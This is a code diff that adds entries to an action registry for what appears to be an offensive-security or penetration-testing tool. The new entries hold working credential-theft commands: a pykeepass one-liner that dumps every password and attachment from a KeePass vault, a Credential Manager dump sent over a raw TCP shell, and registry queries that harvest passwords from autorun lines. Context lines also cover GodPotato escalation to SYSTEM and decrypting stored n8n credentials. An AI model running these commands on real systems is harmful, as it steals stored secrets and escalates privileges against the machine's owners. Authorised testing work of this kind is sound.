@@ -595,6 +595,28 @@ ACTION_REGISTRY: dict[str, Action] = {
         risk="propose", runnable=False,
         note="LLM06 blast radius: the recovered key decrypts every stored n8n credential. The "
              "REST API masks values (__n8n_BLANK_VALUE), so decrypt straight from SQLite."),
+    "keepass_kdbx_open": _a("keepass_kdbx_open",
+        ["python3 -c \"from pykeepass import PyKeePass; "
+         "kp=PyKeePass('$KDBX','$KDBX_MASTER'); "
+         "[print(e.title,e.username,e.password) or "
+         "[open(a.filename,'wb').write(a.data) for a in e.attachments] for e in kp.entries]\""],
+        risk="propose", runnable=False,
+        note="KDBX4 (file version 40000) is NOT supported by keepass2john — use pykeepass. Dumps "
+             "entries and saves attachments (e.g. an encrypted SSH key). Master often recovered "
+             "from Credential Manager (credman_credenumerate_dump) or an HKCU\\Run -pw: argument."),
+    "credman_credenumerate_dump": _a("credman_credenumerate_dump",
+        ["# PowerShell CredEnumerate/CredReadW P/Invoke; DPAPI auto-decrypts Generic creds in the",
+         "# user's session. Deliver base64 (iconv UTF-16LE | base64) as powershell -enc over a raw",
+         "# TCP shell — the RDP clipboard channel mangles the binary blobs.",
+         "cmdkey /list"],
+        risk="propose", runnable=False,
+        note="Dumps every Generic credential in the logged-on user's Credential Manager without a "
+             "masterkey (DPAPI decrypts in-session). This recovered the KeePass master on CLIENT01."),
+    "registry_autorun_secret_read": _a("registry_autorun_secret_read",
+        ["reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"",
+         "reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\""],
+        note="Read autorun command lines; a launcher may pass a password as an argument "
+             "(e.g. KeePass.exe vault.kdbx -pw:<master>)."),
     "windows_potato_to_system": _a("windows_potato_to_system",
         ["# GodPotato (DCOM/RPCSS OXID; arch-independent, 2019-2025) — preferred:",
          "GodPotato.exe -cmd 'cmd /c whoami'",
